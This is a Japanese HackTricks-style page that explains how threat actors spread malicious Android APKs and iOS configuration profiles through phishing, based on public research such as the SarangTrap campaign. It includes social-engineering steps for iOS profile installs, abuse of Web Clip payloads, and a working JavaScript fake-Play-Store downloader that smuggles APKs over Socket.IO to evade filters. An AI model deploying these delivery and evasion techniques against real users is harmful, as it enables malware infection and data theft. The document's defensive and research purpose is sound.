# モバイルフィッシングと悪意のあるアプリの配布（Android & iOS）

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> このページでは、フィッシング（SEO、ソーシャルエンジニアリング、偽ストア、出会い系アプリなど）を通じて、**悪意のあるAndroid APK**や**iOSモバイル構成プロファイル**を配布する脅威アクターの手法を解説します。
> この資料は、Zimperium zLabsが公開したSarangTrapキャンペーン（2025年）およびその他の公開調査をもとにしています。<sup>[[1]](#references)</sup>

## 攻撃フロー

1. **SEO/フィッシングインフラ**
   * 似た名前のドメインを多数登録する（出会い系、クラウド共有、カーサービスなど）。  
     – `<title>`要素に現地語のキーワードや絵文字を使用し、Googleでの検索順位を上げる。  
     – 同じランディングページで、Android（`.apk`）とiOSの両方のインストール手順を掲載する。
2. **初期段階のダウンロード**
   * Android: *未署名*または「サードパーティーストア」のAPKへの直接リンク。  
   * iOS: `itms-services://`、または悪意のある**mobileconfig**プロファイルへの通常のHTTPSリンク（下記参照）。
3. **Androidのインストール後の動作**
   * C2による実行制御、権限の悪用、dropper回避、バックグラウンドでの情報収集など、インストール後のマルウェアの動作については、下記の専用ページで解説します。
4. **iOSの配布手法**
   * 1つの**モバイル構成プロファイル**で、`PayloadType=com.apple.sharedlicenses`、`com.apple.managedConfiguration`などを要求し、デバイスを「MDM」のような監視下に登録できます。  
   * ソーシャルエンジニアリングの手順:
     1. 設定を開き、*プロファイルがダウンロード済み*を選択する。
     2. *インストール*を3回タップする（フィッシングページにスクリーンショットを掲載）。  
     3. 未署名のプロファイルを信頼する ➜ 攻撃者はApp Storeの審査を経ずに*連絡先*と*写真*への権限を取得する。
5. **iOS Web Clipペイロード（フィッシングアプリのアイコン）**
   * `com.apple.webClip.managed`ペイロードを使うと、ブランド化されたアイコンやラベルを付けて、フィッシングURLを**ホーム画面に追加**できます。
   * Web Clipは**フルスクリーン**で実行でき（ブラウザーUIを隠す）、**削除不可**に設定できます。これにより、アイコンを削除するには被害者がプロファイルを削除する必要があります。<sup>[[3]](#references)</sup>
6. **ネットワーク層**
   * 平文のHTTP。多くの場合、`api.<phishingdomain>.com`のようなHOSTヘッダーを付けてポート80で通信する。
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)`（TLSなし → 簡単に検出できる）。

## Androidマルウェアのインストール後の攻撃

C2、Accessibilityの悪用、オーバーレイ、ATS自動化、段階的なDEX読み込み、プレミアムSMS、永続化など、Androidマルウェアのインストール後の手法については、以下を参照してください。

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Socket.IO/WebSocketを利用したAPKの密輸と偽Google Playページ

攻撃者は、静的なAPKリンクを、Google Playに似せたおとりページに埋め込んだSocket.IO/WebSocketチャネルに置き換えるケースを増やしています。これによりペイロードのURLを隠し、URLや拡張子のフィルターを回避し、現実的なインストール体験を維持できます。<sup>[[2]](#references)[[4]](#references)</sup>

実際の攻撃で確認された一般的なクライアントのフロー:

<details>
<summary>Socket.IOを使った偽Playダウンローダー（JavaScript）</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

単純な制御を回避できる理由:
- 静的なAPK URLは公開されず、ペイロードはWebSocketフレームからメモリ内で再構築されます。
- 直接の`.apk`レスポンスをブロックするURL/MIME/拡張子フィルターでは、WebSockets/Socket.IO経由でトンネルされたバイナリデータを見逃す可能性があります。
- WebSocketsを実行しないクローラーやURLサンドボックスは、ペイロードを取得できません。

WebSocketの手法とツールについては、こちらも参照してください:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [ロマンスの暗黒面: SarangTrap恐喝キャンペーン](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Appleデバイス向けWeb Clipsペイロード設定](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [インドネシアとベトナムのAndroidユーザーを標的とするバンカートロイの木馬](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
